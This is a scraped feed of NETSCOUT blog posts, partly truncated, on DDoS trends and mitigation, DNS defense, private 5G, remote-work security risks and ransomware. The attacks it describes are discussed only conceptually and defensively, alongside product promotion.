<p>The primary defense against reflection/amplification attacks is to block the spoofed source packets. Because attacks come from legitimate sources using trusted services such as DNS and NTP, it becomes difficult tell the difference between genuine user workloads and reflected traffic generated by attackers. Adding to the challenge, when a service comes under attack, legitimate user traffic may be forced to retry responses due to the slowdown in service, possibly causing these retries to be falsely identified as DDoS attacks in their own right.&nbsp;</p>

<p>Organizations can take the following steps to mitigate reflection/amplification attacks:&nbsp;</p>

<ul>
	<li><strong>Rate limiting</strong>: This approach restricts sources based on a deviation from a previously established access policy and can be applied to destinations or to sources. Destination rate limiting may inadvertently impact legitimate traffic, making this a less desirable approach. Rate limiting the source is considered more effective.&nbsp;</li>
	<li><strong>Port blocking:</strong> By blocking ports that aren’t needed, organizations can reduce vulnerability to attacks. It’s important to note that this doesn’t prevent attacks on ports that are used by both legitimate and attacker traffic.</li>
	<li><strong>Traffic signature filters:</strong> These filters can be used to identify repetitive structures that are indicative of an attack. The downside of filtering is potential impact on performance. Inspecting every packet may ultimately overwhelm defenses.&nbsp;</li>
	<li><strong>Threat intelligence services:</strong> By using threat intelligence services, security professionals can identify vulnerable servers, allowing organizations to proactively block the IP addresses and cut off potential attacks.</li>

  <title>Is a Private 5G Network Right for Your Company?</title>
  <link>http://localhost:7996/blog/5g-network-for-your-company</link>
  <description>Enterprises today have a wealth of choices when it comes to implementing a 5G network. Building your own private 5G network may make sense, depending on the business requirements.</description>
  <content:encoded><![CDATA[<p>As consumer 5G rapidly expands around the world, enterprises are beginning to <a href="https://www.netscout.com/blog/5g-vendor-harmony-enterprises">explore the advantages</a> of adopting this faster connectivity for their own business purposes. A recent survey found that 71 percent of enterprises believe that 5G networks will have a major impact, particularly when it comes to the enormous potential for building innovative new 5G-based products and services.&nbsp;</p>

<p>5G offers enterprises important business benefits, including:&nbsp;</p>

<ul>
	<li>Greatly improved speed and bandwidth and reliability</li>
	<li>Movement towards zero-touch networks enabled by increased deployment of automation capabilities</li>
	<li>Lower cost alternative to Multiprotocol Label Switching (MPLS) and similar dedicated lines which are typically used for applications that depend on low latency</li>
	<li>Increased RAN capacity capable of supporting higher numbers of devices and users without negatively impacting availability</li>
	<li>Lower energy requirements which extend remote Internet of Things (IoT) device battery life</li>
	<li>256-bit encryption, making 5G a more secure option for sensitive enterprise traffic</li>
</ul>

<p><strong>Enterprises</strong><strong> Now Have Options </strong>&nbsp;</p>

<p>Moreover, enterprises are no longer strictly relegated to offerings from carrier service providers (CSPs), but instead, have a wealth of implementation choices:</p>

<ul>
	<li>Build and operate in-house 5G private networks themselves</li>
	<li>Build and operate a private 5G network in conjunction with a systems integrator</li>
	<li>Work with non-traditional services providers such as Amazon Web Services or Microsoft Azure</li>
	<li>Outsource to a CSP<strong>&nbsp;</strong></li>
</ul>

<p>Carriers have the advantage with size, economies of scale, and expertise, but that doesn’t always make them the best choice. For instance, a basic 5G RAN may be appropriate in the case of a company whose connectivity requirements involve a manufacturing site. On the other hand, a 5G user plane in a factory or hospital setting may be sufficient for applications such as robotics.</p>

<p>Enterprises that are exploring private 5G should keep several things in mind when deciding the best path forward. The following considerations should help narrow the choices:<strong>&nbsp;</strong></p>

<ol>
	<li><strong>What’s the cost benefit? </strong>Match the budget to the application, because implementing private 5G in-house requires a significant investment. In addition to building out an entirely new 5G-capable infrastructure, new wireless gear will be required to take advantage of the network.</li>
	<li><strong>Do you have In-house expertise</strong>? Private 5G puts responsibility for deploying and maintaining critical infrastructure in the hands of enterprise IT, which means businesses must have sufficiently skilled staff available to manage<strong> </strong>all locations.</li>
	<li><strong>Do you need to customize the application?</strong> Putting in place your own 5G infrastructure allows an enterprise to select the parameters that matter most to the business, whether it's high-speed, ultra-low latency, or high reliability.</li>
	<li><strong>Do you need site-specific 5G availability? </strong>Enterprise 5G can be established inside structures where 5G is not yet available from carriers, making fast connectivity available where it’s needed. Think, for example, of using a complete 5G private network in a box, such as those available from major CSPs or AWS Wavelength, to deliver 5G speeds and ultra-low latency in a discrete setting, such as a factory floor.</li>
	<li><strong>Can you handle security?</strong> 5G requires a greater focus on security and protection from threats. Because 5G’s expanded bandwidth enables more users and devices to be connected, there are now increased vectors of exposure that must be monitored.</li>
	<li><strong>What’s your spectrum strategy?</strong> Private 5G does require gaining access to bandwidth on sanctioned 5G spectrum. This may necessitate working with a CSP to obtain permission to use their spectrum or purchasing a government license. Citizens Broadband Radio Service (CBRS) is another lightly licensed option for 5G.</li>
</ol>

<p>Ultimately, the choice of private versus public 5G is one that each business will have to decide, weighing the factors that matter most to their organization. For some, being able to customize their 5G buildouts to satisfy specific application requirements may outweigh the cost savings that CSPs can deliver. Businesses that have the technical expertise in-house are clearly in a better position to assume that 5G role. In the end, it comes down to carefully examining the pros and cons along with a self-assessment of the business.</p>

  <title>Australia: DDoS Attacks Down Under</title>
  <link>http://localhost:7996/blog/australia-under-attack</link>
  <description>A year in review: Detailed DDoS attack data for Australia</description>
  <content:encoded><![CDATA[<p>We saw record-breaking numbers of distributed denial of service (DDoS) attacks in 2020, and the COVID-19 pandemic was the clear catalyst. Attackers widened their target profile beyond usual-suspect industries as the massive shift to online work and play opened promising new avenues of attack. And as the world leaned even more heavily on pandemic-era mainstays such online streaming, ecommerce, cloud, and online learning, attackers naturally followed.</p>

<p>While that unprecedented activity was widely reflected worldwide, it’s also useful to narrow the lens to see variations in impact at a more granular level. Our new weekly series focuses on DDoS activity in specific countries.  This week:<a href="https://www.netscout.com/sites/default/files/2021-04/SECR_028_EN-2101-TR2H2020_APAC_Australia.pdf"> Australia.   </a></p>

  <title>Manufacturer Assures Both Availability and Quality End-User Experience for Remote Workers</title>
  <link>http://localhost:7996/blog/manufacturer-remote-work-quality</link>
  <description>Learn how one worldwide equipment manufacturer delivers quality remote-employee experience with nGeniusONE Service Assurance and Arbor Edge Defense DDoS protection solutions from NETSCOUT.</description>
  <content:encoded><![CDATA[<p>In the face of the COVID-19 pandemic, directives to self-isolate sent all but essential personnel home to work remotely—a workplace shift stretching from weeks to months to sometimes more than a year. Companies large and small now are determining their strategy going forward for when and how to bring back some or all of their employees. One thing is clear, however: <a href=" https://www.netscout.com/blog/many-remote-work-here-stay-can-it-deliver-user-expectations ">Remote work</a> was largely deemed successful. Although there were some drawbacks and the situation was not always ideal, it was still more manageable than many had expected.</p>

<p>Corporate IT teams can be credited, in part, for this <a href=" https://www.netscout.com/blog/remote-work-wake-call-digital-infrastructure ">work-from-home success</a>. If remote workers are unable to connect to the corporate network and application resources over virtual private network (VPN) or internet service provider (ISP) links, or if they experience delays, resets, cutoffs, disconnects, or other disruptions when accessing their data, voice, or video communications, then these employees are hard-pressed to be productive. Avoiding and/or quickly rectifying such occurrences has been a priority of IT organizations around the world.</p>

<p>Disruptions can occur for a variety of reasons. Typically, however, they fall under either a performance or a security umbrella. Identifying and pinpointing which of these domains the issue falls under requires visibility, particularly at the data center access point. Learn how one equipment manufacturer with tens of thousands of employees across 30 countries used NETSCOUT’s service assurance and security solutions to achieve success for its remote workforce using corporate network and application services.</p>

  <title>Top Ten Industries Under Attack</title>
  <link>http://localhost:7996/blog/top-ten-industries-under-attack</link>
  <description>The top 10 vertical industries under attack in the second half of 2020 further highlight the enormous impact COVID-19 had on DDoS attack activity.</description>
  <content:encoded><![CDATA[<p>As the COVID-19 pandemic triggered a massive shift in internet usage, cybercriminals quickly pounced, launching more than 10 million distributed <a href="https://www.netscout.com/what-is-ddos">denial-of-service (DDoS</a>) attacks aimed at crippling targets with a heavy reliance on online services. Attack frequency spiked 20 percent year over year and 22 percent for the last six months of 2020.</p>

<p>According to the most recent NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a>, vital pandemic industries such as ecommerce, streaming services, online learning, and healthcare all experienced increased attention from malicious actors targeting the very online services essential to remote work and online life. The top 10 vertical industries under attack in the second half of 2020 further illustrates the enormous impact COVID-19 had on DDoS attack activity. Threat actors always have embraced an opportunistic pivot, and this was no exception as they enthusiastically flocked to the ensuing smorgasbord of new opportunities. </p>

<p><img alt="Top ten verticals for DDoS activity" data-entity-type="file" data-entity-uuid="4b5d8aa2-4266-4688-82f3-4031811da043" src="http://localhost:7996/sites/default/files/inline-images/Top10_Blog.png" /></p>

<p>The top three listed sectors fall under the category of Old Faithfuls, because attacks on both subscribers and their operational infrastructures are inherent to their role as connectivity providers. However, attackers widened their target profile beyond typical targets as the massive shift to online work and play opened promising new avenues of attack. For instance, the fourth sector—Internet Publishing and Broadcasting—is by no means a usual suspect in our top 10. Its presence can be summed up in two words: Netflix and Zoom. Similarly, online shopping, which grew an impressive <a href="https://www.digitalcommerce360.com/article/us-ecommerce-sales/">44 percent</a> in 2020, represents another pandemic stalwart that came under increased attack, as did online learning. Interestingly, this activity was seen not only at the usual hot spots of colleges and universities but also at the high school and middle school level. With DDoS-for-hire services both readily available and incredibly cheap, it seems likely that budding online delinquents set about playing hooky on an internet scale.</p>

  <title>Top Four Tactics for DNS Infrastructure Defense</title>
  <link>http://localhost:7996/blog/four-tactics-dns-defense</link>
  <description>The Domain Name System (DNS) infrastructure is a critical part of your network. Learn how to defend against DDoS attacks that can bring it down.</description>
  <content:encoded><![CDATA[<p>For something so important, we take a lot of the services provided by Domain Name System (DNS) for granted. But DNS availability is critical for anyone providing services or content across the internet,&nbsp; and there have been a number of high-profile, high-impact attacks against DNS over the years. For example, the 2016 Mirai attacks against DNS service provider DYN impacted millions of users of services such as Netflix. &nbsp;</p>

<p>There are several types of common DNS attacks. The Mirai attackers used a <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS) attack</a> to make DNS unavailable. Using a technique known as Water Torture, the attackers used a botnet to generate DNS queries for millions of random hosts, putting a huge load on the DNS infrastructure and rendering it unavailable for genuine user queries.</p>

<p>Bad actors can also leverage DNS to attack third-party targets by using reflection/amplification attacks to generate large-scale volumetric attacks.</p>

<p>A <a href="https://www.netscout.com/what-is-ddos/what-are-reflection-amplification-attacks">DNS reflection/amplification attack</a> uses a botnet to &nbsp;generate DNS queries using the source IP address of the intended DDoS victim. The DNS servers innocently send their large volume of responses back to the victim, creating traffic volume as much as 10 to 100 times higher than that generated by the original botnet. Once the limits on bandwidth for the network, server, or application are reached, the circuit becomes unavailable.</p>

<p>We recommend the following tactics to build a holistic defense strategy for defending against DNS DDoS attacks:</p>

<p><strong>Current threat intelligence. </strong>Threat intelligence is a crucial tool for DDoS detection and mitigation. Security personnel and DNS administrators must not only be aware of the latest DNS exploits but also understand how the exploit works, and what it does to fully understand the impact on DNS infrastructure. &nbsp;</p>

<p><strong>Regular audits.</strong> &nbsp;Proper maintenance is critical. Organizations must include DNS infrastructure in periodic, realistic tests of the organization’s DDoS mitigation plan, as well as regularly audit and properly configure DNS servers.</p>

<p><strong>Network visibility. </strong>Companies must be able to <a href="https://www.netscout.com/product/arbor-sightline">quickly detect </a>&nbsp;abnormal DNS traffic, including both &nbsp;application-layer and volumetric reflection/amplification DNS vector attacks. To accomplish this, you will need visibility and fast detection at Layer-3/4 and Layer-7 of the network.</p>

<p><strong>Orchestrated mitigation.</strong>&nbsp; Companies can orchestrate multiple methods of mitigation, including their own network infrastructure, dedicated <a href="https://www.netscout.com/product/arbor-threat-mitigation-system">DDoS mitigation</a> products, and for network operators, information sharing with other operators. By implementing such an orchestrated mitigation strategy, companies can strategically assign different methods of mitigation to different attack vectors.</p>

  <title>5G Providers: Is Vendor Harmony at Stake for Enterprises?</title>
  <link>http://localhost:7996/blog/5g-vendor-harmony-enterprises</link>
  <description>5G edge and enterprise 5G are game changers—but if you want to win, you’ll need to build a much deeper partnership ecosystem across enterprises, service providers, cloud providers, and system integrators.</description>
  <content:encoded><![CDATA[<p>Spending on 5G infrastructure globally is projected to grow at&nbsp;<a href="https://www.reportlinker.com/p05824471/5G-Infrastructure-Market-by-Communication-Infrastructure-Core-Network-Network-Architecture-Operational-Frequency-End-User-Geography-Global-Forecast-to.html">67% CAGR</a>, from $784 million in 2019 to $47.8 billion in 2027. Clearly, companies are jumping aboard the incredible opportunities that areas such as 5G edge and private 5G infrastructures present. But as Bruce Kelley, CTO and SVP of NETSCOUT, Service Provider, points out in a recent Forbes article, 5G edge and enterprise 5G require a much deeper partnership ecosystem across enterprises, service providers, cloud providers, and system integrators in order to succeed.</p>

<p>Leveraging <a href="https://www.aspi.org.au/report/ensuring-trusted-5g-ecosystem-vendors-and-technology">the right partnerships</a> can accelerate revenue growth, quality of service, and better customer experiences.</p>

<p>Conversely, partnerships limited in offerings can lead to missed business opportunities. To take full advantage, companies must understand their unique use cases to ensure alignment and continuous growth with the right partners.</p>

<p>What is the secret sauce that leverages each enterprise ecosystem to ensure the right cooks are in the kitchen?</p>

<p>Enterprises must ensure they have one last key ingredient: the <a href="https://www.netscout.com/whitepaper/why-do-we-need-visibility-to-innovate">requisite visibility</a> to properly leverage this ecosystem for each enterprise's needs.</p>

  <title>Surging DDoS Attacks Drive Growing Demand for Third-Party Protection Services </title>
  <link>http://localhost:7996/blog/surging-ddos-attacks-drive-mssp-demand</link>
  <description>A record-breaking number of DDoS attacks in 2020 has driven a surge in demand for services from managed security service providers (MSSPs).</description>
  <content:encoded><![CDATA[<p>As the global workforce largely shifted to work-from-home in response to the COVID-19 pandemic, reliance on online services soared. Many businesses were able to successfully pivot to this new normal as remote connectivity allowed access to vital systems and data. But as is often the case, <a href="https://www.netscout.com/blog/your-vpn-gateway-vulnerable-ddos-attacks">no good deed goes unpunished</a>. As the latest NETSCOUT <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a> shows, cybercriminals have exploited new vulnerabilities created by <a href="https://www.netscout.com/blog/cybersecurity-remote-work-world">remote work</a> across a wide variety of vertical industries.</p>

<p>Making matters worse, perpetrators no longer have to be particularly technology-savvy in order to pull off attacks. Today, it is easy and relatively inexpensive to access sophisticated attack tools via for-hire services: A cottage industry has sprung up to support these nefarious activities.</p>

<p>One result of this trend has been a marked increase in <a href="https://www.netscout.com/what-is-ddos">distributed denial-of-service (DDoS)</a> attacks, which has heightened the need for enterprises to be prepared to combat the growing threat.</p>

<p><strong>Increasing Demand for MSSPs</strong></p>

<p>As enterprises face this heightened threat landscape, there is a growing demand for managed security service providers (MSSPs). This is reflected in the growth of the managed security services marketplace, which is expected to expand from $27.7 billion in 2020 to $64.73 billion by 2026.</p>

<p>The increased adoption of managed DDoS protection services is reflective of a lack of internal security resources within many companies. A recent <a href="https://www.mordorintelligence.com/industry-reports/security-managed-services-market">survey</a> found that 9 percent of respondents did not have any dedicated cybersecurity professionals in their organizations. For companies lacking internal resources, MSSPs make good sense.</p>

<p>According to NETSCOUT’s 16th annual Worldwide Infrastructure Security Report <a href="https://www.netscout.com/threatreport">(WISR),</a> MSSPs experienced an increase of 69 percent in enterprise demand in 2020. In particular, the survey notes a significant increase in demand from the education and healthcare sectors. These sectors, which have become increasingly reliant on pandemic-driven online services, have sustained increases in DDoS attacks and DDoS extortion attempts.</p>

<p>Other sectors that have reported increased interest in MSSPs include government, cloud/hosting providers, financial services customers, e-commerce, ISPs, media and entertainment, and retail.</p>

<p><strong>Third-Party Mitigation Services: A Growing Part of the MSSP Landscape</strong></p>

<p>As the size, frequency, and complexity of DDoS attacks increase, MSSPs are expanding the types of DDoS protection they offer customers. According to the WISR, 11 percent of MSSPs are offering third-party DDoS mitigation services. This suggests that demand may be outstripping MSSPs’ ability to deliver sufficient protection services.</p>

<p>Further evidence of growing demand is the fact that MSSPs are increasingly offering multiple tiers of DDoS protection services. The WISR found that such multitier services have more than tripled year over year.</p>

<p>One thing is clear, MSSPs are adding more advanced value-added custom services, and third-party DDoS mitigation services are fast becoming an important part of such offerings.</p>

<p>As cyber attackers broaden their target base to exploit vulnerabilities exposed by a massive shift to remote work, the demand for managed DDoS protection services has become greater than ever. Businesses of all sizes and from all vertical industries are increasingly taking notice, recognizing the importance of putting protective measures in place before they become a victim of an attack and the damage is done.</p>

  <description>A branch of the U.S. government used NETSCOUT’s nGeniusPULSE for visibility into the end-user experience of hundreds of thousands of personnel in locations around the globe.</description>
  <content:encoded><![CDATA[<p>Ensuring the security, performance, and availability of its application services worldwide for this branch of the United States military is a challenging mission for IT and security operations teams. It is especially difficult because the organization has hundreds of thousands of active-duty personnel and citizen employees deployed in dozens of locations around the world.</p>

<p>The IT team of this military branch addressed the challenge by leveraging its nGeniusONE Service Assurance platform and <a href="https://www.netscout.com/product/isng-platform">NETSCOUT Certified InfiniStreamNG appliances</a> to monitor traffic throughout its high-speed data center, which helps the team troubleshoot performance-related issues across the worldwide network. The monitored packets are used for smart data, which provides trended traffic and application information, as well as for mapping service dependencies to use in migrating targeted services to Amazon’s AWS GovCloud (US).</p>

<p>See how this military branch’s IT team ensures that end-user experience with services delivered from AWS GovCloud and contracted SaaS providers are of the same high quality as all of the branch’s data center-based services, thanks to <a href="https://www.netscout.com/product/ngeniuspulse">NETSCOUT’s nGeniusPULSE</a> and <a href="https://www.netscout.com/product/npoint">nPoint technology</a>.</p>

  <title>Latest NETSCOUT Threat Intelligence Report Highlights Unprecedented DDoS Attack Activity </title>
  <link>http://localhost:7996/blog/latest-netscout-threat-intelligence-report-highlights</link>
  <description>As the latest Threat Intelligence Report shows, the COVID-19 pandemic was the clear catalyst for this year’s unprecedented DDoS attack activity. Vital pandemic industries such as ecommerce, streaming services, online learning, and healthcare all experienced increased attention from malicious actors targeting the very online services essential to remote work and online life.</description>
  <content:encoded><![CDATA[<p>According to the latest release of NETSCOUT’s bi-annual <a href="https://www.netscout.com/threatreport">Threat Intelligence Report</a>, a record-setting 10,089,687 Distributed Denial of Service (DDoS) attacks were observed during 2020. Research from both NETSCOUT’s ATLAS Security Engineering &amp; Response Team (ASERT) and the 16th annual Worldwide Infrastructure Security Report (WISR) survey shows that the COVID-19 pandemic was the clear catalyst for this year’s unprecedented DDoS attack activity. Vital pandemic industries such as ecommerce, streaming services, online learning, and healthcare all experienced increased attention from malicious actors targeting the very online services essential to remote work and online life. According to data from the WISR, 83% of enterprises that suffered a DDoS attack reported that firewalls and/or VPN devices contributed to an outage due to the traffic, a year-over-year increase of more than 20 percent.</p>

<p>"Cybercriminals set multiple records in 2020, taking advantage of the shift towards remote work across the globe," stated Richard Hummel, threat intelligence lead, NETSCOUT.&nbsp; "The second half of last year witnessed a huge upsurge in DDoS attacks, brute-forcing of access credentials, and malware targeting internet-connected devices. As the COVID-19 pandemic continues, it will be imperative for security professionals to remain vigilant to protect critical infrastructure."&nbsp;</p>

<p>Other key findings from the NETSCOUT 2H2020 Threat Intelligence Report include:</p>

<ul>
	<li><strong><em>Monthly DDoS attack numbers surpassed 800,000. </em></strong>Threat actors increased their DDoS onslaught due to the pandemic lockdown; monthly DDoS attacks exceeded 800,000 in March and never looked back, representing a new normal for DDoS attack activity. On average, there were 839,083 attacks per month in 2020, an increase of nearly 130 thousand attacks over 2019.&nbsp;</li>
	<li><strong><em>Mirai malware continued to thrive during the pandemic. </em></strong>Adversaries using Mirai malware and its variants took advantage of shifts away from enterprise-grade protection to generate a surge in brute-force attempts on Internet of Things (IoT) consumer-grade devices. Threat actors absorbed more devices into their botnets to further strengthen the frequency, size, and throughput of DDoS attacks worldwide.</li>
	<li><strong><em>Commonly Used UDP-based DDoS attack vectors fueled attack increases. </em></strong>New reflection/amplification DDoS vectors permitted the abuse of misconfigured Microsoft RDP over UDP, Plex Media SSDP, and DTLS services resulting in an increasingly complex threat landscape.</li>
</ul>

<p>NETSCOUT's Threat Intelligence Report covers the latest trends and activities in the DDoS threat landscape. It covers data secured from NETSCOUT's <a href="https://www.netscout.com/product/atlas-intelligence-feed-aif">Active Level Threat Analysis System (ATLAS™)</a> coupled with NETSCOUT's <a href="https://www.netscout.com/asert">ATLAS Security Engineering &amp; Response Team (ASERT)</a> insights.</p>

  <title>Staying Ahead of Shifting ISP Security and Visibility Needs</title>
  <link>http://localhost:7996/blog/staying-ahead-sp-security</link>
  <description>When it comes to traffic visibility and DDoS defense, ISPs need a secure and service-optimized architecture that balances performance, security, cost, revenue, and customer experience.</description>
  <content:encoded><![CDATA[<p>“Build it and they will come” certainly applies to network services. As over-the-top (OTT) services and content delivery such as video and gaming have grown in popularity, internet service providers (ISPs) have had to invest in their network infrastructures to meet expanding demand. With this expansion, many ISPs are moving from a centralized service infrastructure to more meshed networks with service infrastructure distributed to the edge, which gives them the flexibility to provide services better targeted to customer needs.</p>

<p>With these increasingly complex architectural changes taking place, including content being acquired and cached directly at the edge of the network, ISPs face a new set of requirements for traffic visibility and security solutions.</p>

<p>This architectural shift changes the threat surface that network operators must defend from distributed denial-of-service (DDoS) attacks. Although DDoS attacks have been around for decades, these recent are create a need for more distributed threat detection and mitigation capabilities across the network edge. Effective solutions must be more automated to handle the increased number of attacks, and must leverage intelligence to stay ahead of complex threats.</p>

<p><strong>Balancing the Needs of Performance, Security, Cost, Revenue, and Customer Experience</strong></p>

<p>ISPs need a secure and service-optimized architecture that balances performance, security, cost, revenue, and customer experience. &nbsp;The following are important considerations:&nbsp;</p>

<ul>
	<li><strong>Visibility: </strong>Understanding what is going on at the service layer (Layer 7) is key to ensuring “service” performance is optimized. Such visibility enables delivery of a consistent customer experience, while allowing ISPs to reduce costs via focused investment and increase revenue via service bundles and partnerships with OTT vendors.</li>
	<li><strong>DDoS detection:</strong> DDoS attacks remain the main threat to service availability. In response, ISPs need faster detection, automated analytics, and orchestrated mitigation to fend off attacks. Effective solutions provide context around detected anomalies, enabling ISPs to make the best mitigation decisions. This necessitates integration between DDoS, traffic visibility, OTT visibility datasets, and workflows.</li>
	<li><strong>Threat intelligence:</strong> Threat intelligence is a crucial tool for DDoS detection and mitigation, identifying compromised devices communicating across an ISP network as well as automating responses to specific attacks.</li>
	<li><strong>Threat mitigation:</strong> With threat mitigation being more distributed and utilizing multiple mechanisms, orchestrating capabilities across the network becomes key. Individual locations and capabilities cannot be viewed in isolation: ISPs need a holistic view of DDoS activity and mitigation across the network, with full analytics.</li>
	<li><strong>Automation:</strong> Once intelligence, visibility, and mitigation infrastructure and tools are in place, automation becomes possible. Automation can identify and take systemwide action without human intervention, reducing the burden on resources.</li>
	<li><strong>Service enablement:</strong> As more and more businesses come to rely on the internet for day-to-day business operations, ISPs have an invaluable opportunity to offer low-cost, scalable DDoS protection services.&nbsp;</li>
</ul>

<p><strong>Growing Importance of Monitoring, Securing, and Optimizing Terabit Networks </strong></p>

<p>With massive increases in traffic and demand for tailored services, ISPs face significant challenges when it comes to monitoring, securing, and optimizing terabit networks distributed to the edge. This highlights the need for solutions that leverage analytics and intelligence to manage risk and intelligently orchestrate and automate threat responses.</p>

  <title>Make It Smarter: 5G Networks in the City </title>
  <link>http://localhost:7996/blog/smart-cities-and-5G</link>
  <description>As cities get smarter, their networks will evolve to support the growing need for pervasive wireless technologies, open data, and trusted security. Visualize how a smart city powered by 5G could look through this dynamic infographic from NETSCOUT.</description>
  <content:encoded><![CDATA[<p>By 2040, 65 percent of the global population is forecast to <a href="https://www.postscapes.com/anatomy-of-a-smart-city/">live in urban areas</a>, compared with 29 percent in 1950. This urban growth is an important driver in the increasing interest in smart cities. </p>

<p>And as cities get smarter, their networks must evolve to support the growing need for pervasive wireless technologies, open data, and trusted security—a perfect opportunity to use 5G networks to accelerate innovation through existing smart city technology. As a result, the latency and reliability demand for 5G services will likely increase across both public and private industry sectors.</p>

<p>The infographic below gives a sense of the impact that 5G can have on a smart city.</p>

<p> </p>

<p><a data-entity-substitution="canonical" data-entity-type="node" data-entity-uuid="82aa2cb4-b857-437f-9c95-80efe292e42b" href="http://localhost:7996/solutions/enterprise-5g" title="5G for Enterprise"><img alt="5G Network in the City" data-entity-type="file" data-entity-uuid="a69ba6e4-1b18-4a59-95ac-f0322efaeb3d" src="http://localhost:7996/sites/default/files/inline-images/EIG_009_EN-2101-NETSCOUT%205G%20Enterprise%20Smart%20Cty.png" /></a></p>

<p>To extract full benefits from this scenario, all providers—mobile, enterprise, and cloud—must consider a <a href="https://www.netscout.com/whitepaper/why-do-we-need-visibility-to-innovate">visibility solution</a> that ensures end-through-end visibility regardless of service, network, vendor, or technologies to assure innovation, quality of service, and optimum user experience for their 5G networks.</p>

<p><strong>Remote Work Shifts IT’s Focus</strong></p>

<p>When the rapid shift to remote work hit at the onset of pandemic lockdown, IT professionals had to quickly <a href="https://www.netscout.com/blog/your-vpn-task">provide the infrastructure</a> to support this change. Now, IT needs a longer-term cybersecurity strategy that addresses the challenges of remote work:</p>

<p><strong>Disrupted employees. </strong>Current work arrangements are so far from the norm that a new threat has emerged: the "disrupted" employee who can unknowingly increase security vulnerabilities. We are all familiar with the concept of a malicious employee actively trying to damage the company or exfiltrate data out of financial interest or revenge. Much more common is an employee who is fully compliant and follows your security policies as second nature.</p>

<p>A disrupted employee is someone in between: trying to do their job right but with less secure means. He or she may face challenges in getting projects done due to no longer having access to the office's infrastructure or face-to-face interactions. Gone are the water cooler conversations or impromptu meetings in the hallways, as we rely on Zoom or WebEx calls to stay connected. Informal information exchanges are all but gone.</p>

<p><strong>Vulnerable home offices.</strong> Home networks lack typical protections and bifurcations of the corporate office and may be prone to attacks using lateral movement techniques. In these scenarios, after gaining initial access through an insufficiently protected device, such as a family computer, attackers move deeper into a network, searching for other devices to compromise or obtain increased privileges. This continued probing could eventually lead to the exfiltration of sensitive corporate data or high-value intellectual property.&nbsp;</p>

<p><strong>Data at risk.</strong> To do our jobs, we may obtain information on devices that no longer live behind corporate firewalls. Bits and pieces of information source code, marketing materials for a product launch, notes from a rebranding exercise, or business development activities–may end up on a computer of a disrupted employee. Those bits of information present a risk, because hackers are getting increasingly more adept at generating a composite of a company's proprietary data from disparate sources to make stealing it worth their while.</p>

<p>Much of the adversarial activity is anomalous, such as accessing databases generally not part of one's knowledge domain or downloading software code for an unrelated product. But the upheaval across corporate networks brought on by the massive migration to home offices means that these anomalies and lateral movements may be harder to trace and analyze. A few missed red flags may mean severe and unpredictable consequences down the road.</p>

<p><strong>Understanding the new risk profile</strong></p>

<p>Disrupted employees increase the risk profile for insider threats, requiring a comprehensive reassessment of security controls, analytics, acceptable use policies, and education. Understanding a new baseline through analytics is the first and essential step in creating the proper controls and educational programs to help your employees securely accomplish their goals.&nbsp;However, doing so presents challenges.</p>

<p>For example, firewalls are typically our go-to devices to detect and disable malicious North-South traffic (the traffic entering and exiting the network). But as networks evolve, more than fifty percent of the traffic in the data center, either physical or virtual, is now East-West (moving laterally from server to server). Security tools have not yet caught up with the need to inspect and analyze these movements to detect vulnerabilities and threats.&nbsp;Since modern-day networks include containerized applications in highly distributed and hybrid-cloud-based environments, gaining proper visibility has become increasingly difficult, especially with East-West traffic.</p>

<p><strong>Better data for better analytics&nbsp;</strong></p>

<p>Accurate East-West security analytics depend on packet data as the single source of truth, especially in virtualized environments that lack a firmly established network perimeter. Thus, pervasive visibility, a foundational requirement for cybersecurity, may be effort-intensive or costly to achieve, requiring new approaches or specialized tools. Packet data, when converted to smart metadata and actionable insights, helps pinpoint the source of data leaks or security disruptions impacting the network. Granular analytics deal with alert fatigue by directing security teams to the most critical or time-sensitive issues.</p>

  <title>To Pay or Not to Pay—That Is the Ransomware Question</title>
  <link>http://localhost:7996/blog/pay-or-not-pay-ransomware-question</link>
  <description>Ransomware attacks are on the rise. Today’s attackers are highly sophisticated, using techniques and encryption that is virtually unbreakable. But paying the ransom is a bad idea.</description>
  <content:encoded><![CDATA[<p>Ransomware attacks are on the rise. According to one recent industry <a href="http://www.securityinfowatch.com/cybersecurity/article/21163920/why-2020-was-a-banner-year-for-ransomware">report</a>, a <a href="https://www.netscout.com/blog/demo-blocking-ransomware-and-ddos-extortion-attacks">company will be attacked</a> every 11 seconds in 2021, and the costs from these ransomware incidents will reach approximately $20 billion.</p>

<p>What is behind the attacks? The simple answer is money.</p>

<p>“<a href="https://www.netscout.com/blog/five-similarities-between-ddos-and-ransomware-attacks">Ransomware</a> is the biggest, baddest thing in the cybercriminal world right now and has been for the past five or six years,” said NETSCOUT Threat Intelligence Lead Richard Hummel in a recent radio interview with Michael Finney on KGO 810 in San Francisco. “Dating back to the CryptoLocker attackers, ransomware has extorted untold millions of dollars.”</p>

<p><strong>Who Are the Bad Guys? </strong></p>

<p>The cybercriminals behind ransomware attacks range from individuals to organizations to nation states. For example, Hummel mentioned that North Korea has long been involved in cybercriminal activity, including ransomware and DDoS attacks,” he said. “We know several years ago they went after cryptocurrency exchanges. We know they’ve deployed ransomware,” he told Finney. And North Korea is hardly alone in their adversarial activity. “We also know that some of the most sophisticated ransomware operations come from Russia. China is another country of origin for ransomware attacks. There’s probably no part of the world that hasn’t spawned this kind of criminal activity,” Hummel said.</p>

<p><strong>Attacks Have Grown More Sophisticated </strong></p>

<p>In the early days of ransomware attacks, the attackers were less sophisticated, and technology less advanced. The infrastructure used to store encryption keys was often hackable, or even open. Flaws in the code made it possible to create a tool to reverse and unlock the data and systems.</p>

<p>But those days are long gone. Today’s attackers are highly innovative, using techniques and encryption that is virtually unbreakable. There is often no way to secure an encryption key (short of paying the ransom), Hummel pointed out, except in cases where a government or international governmental law enforcement task force intervenes and seizes the perpetrator’s infrastructure.</p>

<p><strong>The Perils of Paying </strong></p>

<p>Businesses who have been victimized by ransomware face the dilemma of whether or not to pay the ransom. Don’t do it, Hummel urged.</p>

<p>“As a security expert, I highly recommend never paying when struck by a ransomware attack,” he said. “I understand this can be a difficult decision to make, and that the need to quickly restore business is a strong motivation. But paying the ransom can have a number of negative consequences. In some cases, a business can be hit with sanctions for supporting a criminal enterprise. And even if you do pay the ransom, the cybercriminals often fail to provide the encryption key to unlock your systems. Even worse, the bad guys have already penetrated your system, and what’s to stop them from using a back door to hit the business again and demand further ransom?”</p>

  <description>Learn how an insurance company used NETSCOUT’s nGeniusONE to help improve call quality for customers during enrollment time.</description>
